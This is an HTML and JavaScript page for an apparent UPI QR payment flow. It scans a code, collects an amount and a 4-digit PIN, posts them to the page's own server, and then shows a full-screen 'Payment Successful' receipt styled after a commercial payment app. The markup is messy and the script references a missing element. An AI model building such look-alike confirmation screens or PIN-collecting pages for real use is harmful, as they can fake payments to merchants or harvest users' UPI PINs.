<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0&icon_names=person" />
  <title>UPI QR Scanner</title>
  <script src="https://unpkg.com/html5-qrcode" type="text/javascript"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin: 30px; }
    .hidden { display: none; }
    .card { border: 1px solid #ddd; padding: 20px; border-radius: 10px; margin: 20px auto; width: 300px; }
    .success { color: green; font-weight: bold; }
  </style>
  <style>
  #scanner {
    width: 300px;   /* adjust width */
    height: 300px;  /* adjust height */
    margin: auto;
  }
</style>

</head>
<body>

  <!-- Scanner -->
  <div id="scanner"></div>
  <p id="scan-msg">Scan a valid UPI QR Code...</p>

  <!-- Amount Entry -->
  <div id="amount-screen" class="hidden">
    <h3 id="payee-info"></h3>
    <input type="number" id="amount" placeholder="Enter Amount" /><br><br>
    <button onclick="goToPassword()">Proceed</button>
  </div>

  <!-- Password Screen -->
  <div id="password-screen" class="hidden">
 
  
    
  



  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PIN Verification</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #fff;
      font-family: Arial, sans-serif;
    }

    .pin-container {
      width: 100vw;
      height: 100vh;
      border: 2px solid black;
      border-radius: 50px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      box-sizing: border-box;
    }

    h2 {
      margin-bottom: 40px;
      font-weight: bold;
      font-size: 24px;
    }

    .pin-inputs {
      display: flex;
      gap: 25px;
      margin-bottom: 40px;
    }

    .pin-inputs input {
      width: 60px;
      height: 70px;
      text-align: center;
      font-size: 32px;
      border: none;
      border-bottom: 3px solid #888;
      outline: none;
      background: transparent;
    }

    .pin-inputs input:focus {
      border-bottom: 3px solid #000;
    }

    button {
      padding: 15px 40px;
      font-size: 18px;
      border: none;
      border-radius: 30px;
      background: black;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background: #333;
    }
  </style>
</head>
<body>
  <div class="pin-container">
    <h2>Enter 4-digit PIN</h2>
    <div class="pin-inputs">
      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    </div>
    <button onclick="verifyPayment()">Submit</button>
  </div>


</body>
</div>

  <!-- Success Screen -->
  <div id="success-screen" class="hidden">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=article,person,share" />

<div id="success-screen">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=article,person,share" />

<div id="success-screen">
  <body>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      font-family: 'Segoe UI', Arial, sans-serif;
      height: 100vh;
      width: 100vw;
      overflow: hidden; /* prevent scroll */
    }

    .container {
      display: flex;
      flex-direction: column;
      height: 100vh;
      width: 100vw;
      background: #fff;
    }

    /* Top green section */
    .green-top {
      flex: 0 0 33vh;
      background: rgb(47, 125, 50);
      border-bottom-left-radius: 24px;
      border-bottom-right-radius: 24px;
      padding: 32px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      position: relative;
    }
    .checkmark-circle {
      background: #fff;
      width: 64px;
      height: 64px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
      z-index: 2;
    }
    .checkmark {
      color: rgb(47, 125, 50);
      font-size: 2rem;
      font-weight: bold;
    }
    .success-text {
      color: #fff;
      font-size: 1.7rem;
      font-weight: 600;
      margin-top: 10px;
      z-index: 2;
    }
    .success-date {
      color: #fff;
      font-size: 0.95rem;
      margin-top: 4px;
      opacity: 0.85;
      z-index: 2;
    }

    /* Middle section with overlapping card */
    .middle-section {
      flex: 1;
      position: relative;
      margin-top: -20vh; /* pull card upwards into green header */
      display: flex;
      justify-content: center;
      padding: 0 16px;
      z-index: 5;
    }
    .card {
      background: #fff;
      border-radius: 24px;
      box-shadow: 0 8px 18px rgba(0,0,0,0.12);
      width: 100%;
      padding: 40px 28px;
      height: max-content;
    }

    .row {
      display: flex;
      align-items: center;
      gap: 16px;
      flex-wrap: wrap;
    }
    .avatar-container {
      background: #f4f2fd;
      border-radius: 50%;
      width: 64px;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 18px rgba(131,79,242,0.12);
      flex-shrink: 0;
    }
    .receiver {
      font-size: 1.2rem;
      font-weight: 600;
      margin-bottom: 4px;
    }
    .phone {
      font-size: 0.9rem;
      color: #7d7494;
    }
    .amount {
      font-size: 1.8rem;
      font-weight: 700;
      color: #19124a;
      margin-left: auto;
    }

    .split-row {
      display: flex;
      justify-content: flex-end;
      margin-top: 12px;
      font-size: 1rem;
    }
    .split-link {
      color: rgb(98, 77, 157);
      cursor: pointer;
      font-weight: 500;
    }

    .action-row {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      margin-top: 48px;
      gap: 14px;
    }
    .action-btn {
      background: #f6f3fd;
      color: #624d9d;
      border: none;
      border-radius: 14px;
      padding: 14px 0;
      flex: 1 1 48%;
      font-size: 1rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 2px 10px rgba(131,79,242,0.1);
      cursor: pointer;
    }

    /* Bottom always at end */
    .bottom-section {
      flex: 0 0 auto;
      padding: 20px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      margin-top: 15px;
    }
    .ad-space {
      width: 90%;
      height: 18vh;
      background-image: url("static/adv.jpg");
      background-size: cover;
      background-position: center;
      border-radius: 22px;
      box-shadow: 0 4px 18px rgba(131,79,242,0.09);
    }
    .done-btn {
      font-size: 1.1rem;
      color: rgb(131, 79, 242);
      border: none;
      background: transparent;
      font-weight: 600;
      padding: 12px 48px;
      border-radius: 14px;
      box-shadow: 0 2px 6px rgba(131,79,242,0.12);
      cursor: pointer;
      letter-spacing: 0.18px;
    }

    /* Responsive adjustments */
    @media (max-width: 480px) {
      .card { padding: 28px 20px; }
      .receiver { font-size: 1rem; }
      .amount { font-size: 1.4rem; }
      .action-btn { flex: 1 1 100%; }
    }
    @media (max-height: 600px) {
      .middle-section { margin-top: -15vh; }
      .card { padding: 28px 20px;}
      .ad-space { height: 15vh; }
    }
  </style>

  <div class="container">
    <!-- Top -->
    <div class="green-top">
      <div class="checkmark-circle">
        <span class="checkmark">&#10003;</span>
      </div>
      <div class="success-text">Payment Successful</div>
      <div class="success-date" id="success-msg"></div>
    </div>

    <!-- Overlapping Card Section -->
    <div class="middle-section">
      <div class="card">
        <div class="row">
          <div class="avatar-container">
            <span class="material-symbols-outlined" id="person">person</span>
          </div>
          <div class="details">
            <div class="receiver" id="receiver"></div>
            <div class="phone" id="phone"></div>
          </div>
          <div class="amount" id="amount-success-screen"></div>
        </div>
        <div class="split-row">
          <span class="split-link">Split Expense</span>
        </div>
        <div class="action-row">
          <button class="action-btn">
            <span class="material-symbols-outlined">article</span>
            View Details
          </button>
          <button class="action-btn">
            <span class="material-symbols-outlined">share</span>
            Share Receipt
          </button>
        </div>
      </div>
    </div>

    <!-- Bottom -->
    <div class="bottom-section">
      <div class="ad-space"></div>
      <button class="done-btn" id="final_done">Done</button>
    </div>
  </div>
</body>

  </div>

  <script>

    const inputs = document.querySelectorAll('.pin-inputs input');

    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    let currentPayee = {};
    const html5QrCode = new Html5Qrcode("scanner");

    Html5Qrcode.getCameras().then(devices => {
      if (devices && devices.length) {
        html5QrCode.start(
          { facingMode: "environment" },
          { fps: 10, qrbox: 250 },
          qrCodeMessage => {
            fetch("/process_qr", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ data: qrCodeMessage })
            })
            .then(res => res.json())
            .then(parsed => {
              currentPayee = parsed;
              document.getElementById("payee-info").innerText =
                `Payee: ${parsed.pn || "Unknown"} (${parsed.pa || ""})`;
              document.getElementById("scanner").classList.add("hidden");
              document.getElementById("scan-msg").classList.add("hidden");
              document.getElementById("amount-screen").classList.remove("hidden");
              html5QrCode.stop();
            });
          }
        );
      }
    });

    function goToPassword() {
      let amount = document.getElementById("amount").value;
      if (!amount) { alert("Enter amount first!"); return; }
      document.getElementById("amount-screen").classList.add("hidden");
      document.getElementById("password-screen").classList.remove("hidden");
      document.getElementById("summary").innerText =
        `Payee: ${currentPayee.pn || "Unknown"} | Amount: ₹${amount}`;
    }

    function verifyPayment() {
      let pin = "";
      inputs.forEach(input => {
        pin += input.value;
      });
      if (pin.length === 4) {
        let password = pin
        let amount = document.getElementById("amount").value;
        fetch("/verify_password", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            password: password,
            amount: amount,
            payee: currentPayee
          })
        })
        .then(res => res.json())
        .then(resp => {
          if (resp.status === "success") {
            document.getElementById("password-screen").classList.add("hidden");
            document.getElementById("success-screen").classList.remove("hidden");
            document.getElementById("success-msg").innerText = resp.timestamp;
            document.getElementById("receiver").innerText = `${resp.payee.pn || "Unknown"}`;   
            document.getElementById("phone").innerText = `${resp.payee.pa || ""}`;
            document.getElementById("amount-success-screen").innerText = `₹${resp.amount}`;
            const audio = new Audio('static/music.wav');
            audio.play()
          } else {
            alert(resp.message);
          }
        });
      } else {
        alert("Please enter all 4 digits.");
      }

    }
  </script>
</body>
</html>
